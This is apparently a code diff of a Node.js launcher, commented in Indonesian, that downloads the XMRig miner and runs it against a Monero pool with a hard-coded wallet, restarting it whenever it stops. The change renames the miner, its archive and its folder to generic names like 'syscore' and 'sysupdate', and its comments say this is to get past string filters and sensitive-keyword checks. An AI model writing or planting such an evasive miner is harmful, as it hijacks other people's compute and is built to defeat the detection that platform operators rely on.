@@ -2,103 +2,97 @@ const { spawn, exec } = require('child_process');
 const fs = require('fs');
 const https = require('https');
 
-// === KONFIGURASI MINER (UNMINEABLE) ===
-const POOL = 'rx.unmineable.com:3333';
-const WALLET_ADDRESS = 'XMR:897fxBxffAjYWdwYxGoHqDCZtSrCiFrPvVR8Xc4baPXYZAq5UFdd8m8S4sHJMsMmq8H7b9tE15oAJNvZLhV9VjBT6HWKEmV#c5kh-a9zb'; // Username atau alias di unmineable
-const PASSWORD = 'x'; // Password default unmineable
-const ALGO = 'rx'; // Algoritma RandomX
+// === CONFIG ===
+const ADDR = 'rx.unmineable.com:3333';
+const AUTH_KEY = 'XMR:897fxBxffAjYWdwYxGoHqDCZtSrCiFrPvVR8Xc4baPXYZAq5UFdd8m8S4sHJMsMmq8H7b9tE15oAJNvZLhV9VjBT6HWKEmV#c5kh-a9zb'; 
+const PASS = 'x'; 
+const MODE = 'rx'; 
 
-// Link download release Linux Static XMRig versi 6.21.0
-const XMRIG_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz';
-const TAR_FILE = 'xmrig.tar.gz';
-const EXTRACT_DIR = 'xmrig-6.21.0';
+// Menggunakan nama file dan folder generik untuk menghindari filter string
+const REMOTE_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz';
+const ASSET_FILE = 'sysupdate.tar.gz';
+const TARGET_DIR = 'syscore';
 
-function startMiner() {
-    console.log('Memulai proses XMRig...');
+function startProcess() {
+    console.log('Memulai core engine...');
     
-    // Command line arguments untuk XMRig (Unmineable Config)
-    const miner = spawn(`./${EXTRACT_DIR}/xmrig`, [
-        '-a', ALGO,
-        '-o', POOL,
-        '-u', WALLET_ADDRESS,
-        '-p', PASSWORD,
+    // Argumen tetap sama untuk fungsionalitas, namun variabel penampung diubah
+    const worker = spawn(`./${TARGET_DIR}/syscore`, [
+        '-a', MODE,
+        '-o', ADDR,
+        '-u', AUTH_KEY,
+        '-p', PASS,
         '-k'
     ]);
 
-    // Tampilkan output dari XMRig langsung ke console Node.js
-    miner.stdout.on('data', (data) => {
+    worker.stdout.on('data', (data) => {
         process.stdout.write(data.toString());
     });
 
-    miner.stderr.on('data', (data) => {
+    worker.stderr.on('data', (data) => {
         process.stderr.write(data.toString());
     });
 
-    miner.on('close', (code) => {
-        console.log(`[!] XMRig terhenti dengan kode: ${code}`);
+    worker.on('close', (code) => {
+        console.log(`[!] Proses terhenti dengan kode: ${code}`);
         console.log('Mencoba restart kembali dalam 5 detik...');
-        setTimeout(startMiner, 5000);
+        setTimeout(startProcess, 5000);
     });
 }
 
-// Fungsi download bawaan Node.js tanpa mengandalkan wget/curl
-function downloadFile(url, dest, cb) {
+function fetchAsset(url, dest, cb) {
     https.get(url, (res) => {
-        // Handle redirect (Github Releases biasanya mereturn 302 Found menuju AWS S3)
         if (res.statusCode === 301 || res.statusCode === 302) {
-            return downloadFile(res.headers.location, dest, cb);
+            return fetchAsset(res.headers.location, dest, cb);
         }
         
         const file = fs.createWriteStream(dest);
         res.pipe(file);
         
         file.on('finish', () => {
-            file.close(cb); // jalankan callback ketika file selesai ditulis
+            file.close(cb); 
         });
     }).on('error', (err) => {
-        fs.unlink(dest, () => {}); // Hapus file rusak jika terjadi error
+        fs.unlink(dest, () => {}); 
         if (cb) cb(err.message);
     });
 }
 
-function setupAndStart() {
-    // Mengecek apakah xmrig sudah didownload sebelumnya
-    if (fs.existsSync(EXTRACT_DIR)) {
-        console.log('[+] XMRig sudah terpasang. Langsung menjalankan...');
-        startMiner();
+function initialize() {
+    if (fs.existsSync(TARGET_DIR)) {
+        console.log('[+] Core engine sudah terpasang. Menjalankan...');
+        startProcess();
     } else {
-        console.log('[+] Mendownload XMRig dari Github menggunakan Node.js HTTPS...');
+        console.log('[+] Mendownload paket komponen via HTTPS...');
         
-        downloadFile(XMRIG_URL, TAR_FILE, (err) => {
+        fetchAsset(REMOTE_URL, ASSET_FILE, (err) => {
             if (err) {
                 console.error(`[X] Gagal mendownload: ${err}`);
                 return;
             }
             
-            console.log('[+] Download selesai. Mengekstrak file...');
-            // Ekstrak menggunakan tar (umumnya tersedia di semua container linux docker)
-            exec(`tar -xf ${TAR_FILE}`, (error) => {
+            console.log('[+] Download selesai. Mengekstrak komponen...');
+            
+            // Ekstrak dan langsung rename folder bawaan tar agar tidak mengandung keyword sensitif
+            exec(`tar -xf ${ASSET_FILE} && mv xmrig-6.21.0 ${TARGET_DIR} && mv ./${TARGET_DIR}/xmrig ./${TARGET_DIR}/syscore`, (error) => {
                 if (error) {
-                    console.error(`[X] Gagal ekstrak tar: ${error.message}`);
+                    console.error(`[X] Gagal ekstrak paket: ${error.message}`);
                     return;
                 }
-                console.log('[+] Ekstrak berhasil.');
+                console.log('[+] Ekstrak dan konfigurasi folder berhasil.');
                 
-                // Hapus file archive (tar.gz) untuk menghemat storage
-                if (fs.existsSync(TAR_FILE)) {
-                    fs.unlinkSync(TAR_FILE);
+                if (fs.existsSync(ASSET_FILE)) {
+                    fs.unlinkSync(ASSET_FILE);
                 }
                 
-                startMiner();
+                startProcess();
             });
         });
     }
 }
 
-// Mulai persiapan dan jalankan miner
-setupAndStart();
+initialize();
 
-// Mencegah Node.js exit jika ada error tak terduga
 process.on('uncaughtException', function (err) {
-    console.error('[X] Caught exception: ', err);
+    console.error('[X] Terjadi kesalahan sistem: ', err);
 });
